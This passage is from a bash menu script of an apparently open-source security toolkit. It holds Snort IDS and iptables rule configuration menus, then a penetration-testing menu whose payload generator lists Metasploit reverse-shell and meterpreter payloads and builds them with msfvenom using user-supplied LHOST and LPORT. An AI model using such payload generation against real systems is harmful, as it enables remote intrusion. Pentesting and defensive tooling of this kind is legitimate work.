				if [ $firewall_option -eq 3 ]
				then
					clear 
					banner 
					details 
					echo 
					echo " What do you wish to do? "
					echo 
					echo "  1) Turn on IDS mode"
					echo "  2) To add our own rule into IDS"
					echo "  3) To check the configuration file of snort"
					echo 
					echo " 99) Go a menu back"
					echo 
					while true 
					do
					echo -n -e "\e[0;36m[nst][firewall][IDS]>\e[0m " 
					read ids_choice
					echo 
					if [ $ids_choice -eq 3 ]
					then
						echo "${bold}[*] Checking configuration file of snort...${normal}"
						echo 
						snort -T -c /etc/snort/snort.conf 
						echo 
					elif [ $ids_choice -eq 1 ]
					then
						echo "${bold}[*] Turning on IDS mode...${normal}"
						echo 
						snort -A console -c /etc/snort/snort.conf 
						echo 
					elif [ $ids_choice -eq 2 ]
					then
						read -p  "${bold}[>]${normal} Enter the protocol type to block connections from(default 'tcp'): " protocol 
						read -p "${bold}[>]${normal} Is the connection you want to block from an external network? [Y/n]: " ext 
						while true 
						do 
						if [ "$ext" == "Y" ]
						then
							read -p "${bold}[>]${normal} Do you wish to specify a port number to block connections from? [default:any][Y/n]: " blk_port
							while true
							do 
							if [ "$blk_port" == "Y" ]
							then 
								read -p "${bold}[>]${normal} Enter the port number: " port_num 
								read -p "${bold}[>]${normal} Do you wish to print a custom message to display while catching Intrusions? [Y/n]: " disp 
								while true 
								do
								if [ "$disp" == "Y" ]
								then 
									read -p "${bold}[>]${normal} Enter your message: " msg  
									echo 
									echo "alert $protocol EXTERNAL_NET any -> HOME_NET $blk_port (msg:"$msg",sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								elif [ "$disp" == "n" ]
								then  
									echo 
									echo "alert $protocol EXTERNAL_NET any -> HOME_NET $blk_port (sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								else 
									echo -e "\e[0;31m[!] Enter valid option\e[0m"
									break 
								fi 
								done

							elif [ "$blk_port" == "n" ]
							then 
								read -p "${bold}[>]${normal} Do you wish to print a custom message to display while catching Intrusions? [Y/n]: " disp 
								while true 
								do 
								if [ "$disp" == "Y" ]
								then 
									read -p "${bold}[>]${normal} Enter your message: " msg  
									echo 
									echo "alert $protocol EXTERNAL_NET any -> HOME_NET any (msg:"$msg",sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo
										break
									else
										break
									fi
									
								elif [ "$disp" == "n" ]
								then  
									echo 
									echo "alert $protocol EXTERNAL_NET any -> HOME_NET $blk_port (sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								else 
									echo -e "\e[0;31m[!] Enter valid option\e[0m"
									break
								fi 
								done
							else 
								echo -e "\e[0;31m[!] Enter valid option "
								break
							fi
							done

						elif [ "$ext" == "n" ]
						then
							read -p "${bold}[>]${normal} Do you wish to specify a port number to block connections from? [default:any][Y/n]: " blk_port
							while true 
							do 
							if [ "$blk_port" == "Y" ]
							then 
								read -p "${bold}[>]${normal} Enter the port number: " port_num 
								read -p "${bold}[>]${normal} Do you wish to print a custom message to display while catching Intrusions? [Y/n]: " disp 
								while true 
								do 
								if [ "$disp" == "Y" ]
								then 
									read -p "${bold}[>]${normal} Enter your message: " msg  
									echo 
									echo "alert $protocol any any -> HOME_NET $blk_port (msg:"$msg",sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo
										break
									else
										break
									fi
								elif [ "$disp" == "n" ]
								then  
									echo 
									echo "alert $protocol any any -> HOME_NET $blk_port (sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								else 
									echo -e "\e[0;31m[!] Enter valid option\e[0m"
								fi
								done  

							elif [ "$blk_port" == "n" ]
							then 
								read -p "${bold}[>]${normal} Do you wish to print a custom message to display while catching Intrusions? [Y/n]: " disp
								while true 
								do  
								if [ "$disp" == "Y" ]
								then 
									read -p "${bold}[>]${normal} Enter your message: " msg  
									echo 
									echo "alert $protocol any any -> HOME_NET any (msg:"$msg",sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								elif [ "$disp" == "n" ]
								then  
									echo 
									echo "alert $protocol any any -> HOME_NET $blk_port (sid:1000001,rev:1)" >> /etc/snort/rules/local.rules 
									echo "${bold}[>]${normal} Rules added successfully"
									echo 
									read -p "${bold}[>]${normal} Do you wish to view the rules file? [Y/n]: " wish_rule
									if [ "$wish_rule" == "Y" ]
									then
										cat /etc/snort/rules/local.rules
										echo 
										break
									else
										break
									fi
								else 
									echo -e "\e[0;31m[!] Enter valid option\e[0m"
								fi 
								done 
							else 
								echo -e "\e[0;31m[!] Enter valid option\e[0m" 
							fi
							done 
						else
							echo -e "\e[0;31m[!] Enter valid option\e[0m"
							break
						fi
						done 

					elif [ $ids_choice -eq 99 ]
					then 
						clear 
						banner 
						details 
						echo 
						firewall
					fi
					done

				elif [ $firewall_option -eq 99 ]
				then
					clear
					banner
					details
					echo ""
					main
				elif [ $firewall_option -eq 1 ]
				then
					echo -e "\e[0;32m[*] Command used - iptables -nL \e[0m"
					echo ""
					echo "[!] Here's your IPTABLES configuration:"
					echo ""
					iptables -nL
					echo ""
				elif [ $firewall_option -eq 2 ]
				then
					# echo ""
					# clear
					# banner
					# details
					# echo ""
					echo " What do you wish to do? "
					echo ""
					echo "  1) Add a new rule"
					echo "  2) Flush an existing rule"
					echo "  3) Flush all the rules from the firewall"
					echo ""
					echo " 99) Go a menu back"
					echo ""

					while true 
					do
					echo -e "\e[0;36m"
					read -p "[nst][firewall][configure]${normal}> " firewall_choice
					echo ""
					if [ $firewall_choice -eq 99 ]
					then
						firewall
						echo ""
		
					elif [ $firewall_choice -eq 1 ]
					then
						read -p "Enter ip address to set rules upon: " ip_firewall
						read -p "Is this a source ip or destination ip(src/dst):" ip_type
						if [ "$ip_type" == "src" ]
						then 
							read -p "Specify rule type(INPUT/FORWARD/OUTPUT): " user_choice
							if [ "$user_choice" == "INPUT" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								fi
							elif [ "$user_choice" == "FORWARD" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								fi
							elif [ "$user_choice" == "OUTPUT" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								fi
							fi
						elif [ "$ip_type" == "dst" ]
						then
							read -p "Specify rule type(INPUT/FORWARD/OUTPUT): " user_choice
							if [ "$user_choice" == "INPUT" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								fi
								
							elif [ "$user_choice" == "FORWARD" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" == "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								fi
							elif [ "$user_choice" == "OUTPUT" ]
							then
								read -p "Specify the action to perform(ACCEPT/DROP): " user_firewall_action
								if [ "$user_firewall_action" == "ACCEPT" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" -eq "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
									fi
								elif [ "$user_firewall_action" == "DROP" ]
								then
									read -p "Do you wish to specify a port to set rule upon(yes/no): " port_wish_firewall
									if [ "$port_wish_firewall" == "no" ]
									then
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -j $user_firewall_action
										# echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									elif [ "$port_wish_firewall" -eq "yes" ]
									then
										echo ""
										echo "[!] Some commonly used port numbers"
										echo ""
										echo "  1) tcp"
										echo "  2) udp"
										echo "  3) ssh(port 22)"
										echo "  4) smtp(port 25)"
										echo "  5) http(port 80)"
										echo "  6) https(port 443)"
										echo ""
										read -p "Enter port number: " user_port_choice
										echo ""
										echo -e "\e[0;32m[!] Command Used - iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action\e[0m"
										echo ""
										iptables -A $user_choice -s $ip_firewall -p $user_port_choice -j $user_firewall_action
										echo ""
										echo "Rules added successfully"
										echo ""
										iptables -nL
										echo ""
									else
										echo -e "\e[0;31m[!] Enter valid option\e[0m"
										echo ""
									fi
								else
									echo -e "\e[0;31m[!] Enter valid action\e[0m"
									echo ""
								fi
							else
								echo -e "\e[0;31m[!] Enter valid choice\e[0m"
								echo ""
							fi
						else
							echo -e "\e[0;31m[!] Enter valid ip-type\e[0m"
							echo ""
						fi
					elif [ $firewall_choice -eq 3 ]
					then
						echo "Flushing rules..."
						echo ""
						echo -e "\e[0;32m[*] Command used - iptables --flush\e[0m"
						iptables --flush
						echo ""
						iptables -nL
						echo ""
						echo "DONE!"
						echo ""
					elif [ $firewall_choice -eq 2 ]
					then
						# echo ""
						iptables -nL
						echo ""
						read -p "Specify rule type(INPUT/FORWARD/OUTPUT): " rule_type
						read -p "Enter the number of rule you wish to be erased: " flush_no
						echo ""
						echo -e "\e[0;32m[*] Command used - iptables -D $rule_type $flush_no\e[0m"
						iptables -D $rule_type $flush_no
						echo ""
						iptables -nL
						echo ""
						echo "DONE!"
						echo ""
					else
						echo -e "\e[0;31m[!] Enter valid choice\e[0m"
						echo ""
					fi
					done
				else
					echo -e "\e[0;31m[!] Enter valid option\e[0m"
					echo ""
				fi
				done
			}

			# web_recon()
			# {
				
			# }

			incidence_resp()
			{
				echo -e "Loading uncover framework..."
				sleep 1
				UNCOVER_BANNER
				keyboard_interruptt()
				{
					echo ""
					echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
				bash /usr/share/ntoolkit/dependencies/dependencies/uncover.sh 
			}

			pentesting_without_network()
			{
				# sleep 1
				echo -e "\e[1;36m[-]\e[0m Checking for requirements. "
				sleep 1 
				echo -e "\e[1;36m[-]\e[0m requirements satisfied. "
				# sleep 1
				PENTESTING_BANNER
				# clear
				# banner 
				# details 
				echo "Welcome to the NST's ${bold}Rapid Penetration-testing menu.${normal} This pentesting-automator can perform numerous tasks 
such as web-scanning, brute forcing, wireless attacks, etc. This automator uses some third-party tools which are 
downloaded from the developer's website ${bold}as-is${normal} with proper credits mentioned under the ${bold}README.md${normal} file. "
				keyboard_interruptt()
				{
					echo ""
					clear 
					banner 
					details 
					echo 
					main
					# echo -e " \n\n\e[0;31m QUITTING!\e[0m\n"
					# echo ""
					exit 2
				}
				trap "keyboard_interruptt" 2
				echo -e "\n Select From The Menu:"
				echo ""
				echo "  1) Target-related wordlist generator(done)"
				echo "  2) Third-party payload generator(done)"
				echo "  3) Web-directories enumerator(done)"
				echo -e "\e[0;31m  4)\e[0m Open source intelligence"
				echo -e "\e[0;31m  5)\e[0m Wireless attacks"
				echo -e "\e[0;31m  6)\e[0m Port scanning "
				echo -e "\e[0;31m  7)\e[0m Wordlists downloader"
				echo "  8) Hash identifier/cracker"
				echo -e "\e[0;31m  9)\e[0m Denial of service(done)"
				echo " 10) Wordpress scanner"
				echo " 11) Joomla scanner"
				echo " 12) Web-reconnaissance"
				echo -e "\e[0;31m 13)\e[0m SQL injection(done)"
				echo " 14) Password Cracker"
				echo " 15) Search for an exploit from Exploit-DB"
				echo 
				echo " 99) Back to main menu"
				while true
				do
				under=$(tput smul)
				normal=$(tput sgr0)
				echo -n -e "\n\e[0;0m${under}nst${normal}:\e[0;0m${under}pentesting${normal} > "
				read  pen_choice
				echo ""
				case ${pen_choice} in 
					"1")
					python3 /usr/share/ntoolkit/dependencies/dependencies/cupp.py -i
					;; 

					"2")
					echo -e " List of payloads:\n"
					echo -e "\e[0;32m${bold}LINUX:\e[0m${normal}\n"
					echo "1) linux/x86/meterpreter/reverse_tcp"
					echo "2) linux/x64/meterpreter/reverse_tcp"
					echo "3) linux/x86/shell/reverse_tcp"
					echo "4) linux/x64/shell/reverse_tcp"
					echo "5) payload/linux/x86/adduser"
					echo "6) payload/linux/x86/meterpreter_reverse_https"
					echo "7) payload/linux/x64/meterpreter_reverse_https"
					echo "8) payload/linux/mipsbe/shell_bind_tcp"
					echo "9) payload/linux/mipsle/shell_bind_tcp"
					echo
					echo -e "\e[0;32m${bold}WINDOWS:\e[0m${normal}\n" 
					echo "10) windows/x64/meterpreter_reverse_https"
					echo "11) windows/x64/meterpreter_reverse_tcp"
					echo "12) windows/x64/meterpreter_reverse_tcp"
					echo "13) exploit/windows/http/apache_tika_jp2_jscript"
					echo "14) exploit/multi/http/tomcat_mgr_upload"
					echo "15) payload/generic/debug_trap"
					echo "16) payload/windows/dllinject/reverse_tcp_rc4"
					echo "17) payload/windows/shell/bind_tcp"
					echo "18) payload/cmd/windows/reverse_powershell"
					echo
					echo -e "\e[0;32m${bold}OSX:\e[0m${normal}\n"  
					echo "19) payload/osx/armle/shell_bind_tcp"
					echo "20) payload/osx/x86/vforkshell_reverse_tcp"
					echo "21) payload/osx/x86/exec"
					echo "22) payload/osx/x64/exec"
					echo "23) payload/osx/x64/meterpreter_reverse_http"
					echo "24) payload/osx/x64/meterpreter_reverse_https"
					echo "25) payload/osx/x64/meterpreter_reverse_tcp"
					echo "26) exploit/multi/browser/java_jre17_driver_manager"
					echo 
					echo -e "\e[0;32m${bold}ANDROID:\e[0m${normal}\n" 
					echo "27) payload/android/meterpreter_reverse_http (Inline)"
					echo "28) payload/android/meterpreter_reverse_https (Inline)"
					echo "29) payload/android/meterpreter_reverse_tcp (Inline)"
					echo "30) payload/android/shell/reverse_http (stager)"
					echo "31) payload/android/shell/reverse_https (stager)"
					echo "32) payload/android/shell/reverse_tcp (stager)"
					echo 
					echo -e "99) Back to the previous menu\n"
					
					under=$(tput smul)
					normal=$(tput sgr0)
					# echo -e "\e[0;36m"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Your choice (write full name|'99' for exit): " payload_option
					echo -e "Payload set to => \e[0;31m$payload_option\e[0m"
					if [ "$payload_option" == "99" ]
					then
						clear
						banner 
						details 
						echo 
						pentesting
					fi
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set LHOST: " lhost
					echo -e "LHOST => $lhost"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set LPORT: " lport
					echo -e "LPORT => $lport"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Set RHOST: " rhost
					echo -e "RHOST => $rhost"
					read -p "${under}nst${normal}:${under}pentesting${normal}:${under}payload-generate${normal} > Do you wish to 4encode the payload(y/N): " encode
					if [ "$encode" == "y" ]
					then
						read -p "Encoder to use(type 'list' for the list of encoders): " encoder_to_use
						if [ "$encoder_to_use" == "list" ]
						then
							cat $(pwd)/dependencies/encoder.txt
							echo
							read -p "Encoder to use(type 'list' for the list of encoders): " encoder_to_use1
							read -p "Extension(exe/apk/bat/sh/php): " extension
							msfvenom -p $payload_option LHOST=$lhost LPORT=$lport > /usr/share/ntoolkit/payloads/payload.$extension -e $encoder_to_use1
							echo 
							echo -e "Payload generated and has been saved to '\e[0;32m/usr/share/ntoolkit/payloads/payload.$extension\e[0m'"
							echo 
						fi 
					else
						read -p "Extension(exe/apk/bat/sh/php): " extension
						msfvenom -p $payload_option LHOST=$lhost LPORT=$lport > /usr/share/ntoolkit/payloads/payload.$extension
						echo 
						echo -e "Payload generated and has been saved to '\e[0;32m/usr/share/ntoolkit/payloads/payload.$extension\e[0m'"
						echo 
					fi
					;;

					"3")
					echo -n "Enter ip address/domain name: " 
					read ip_addr
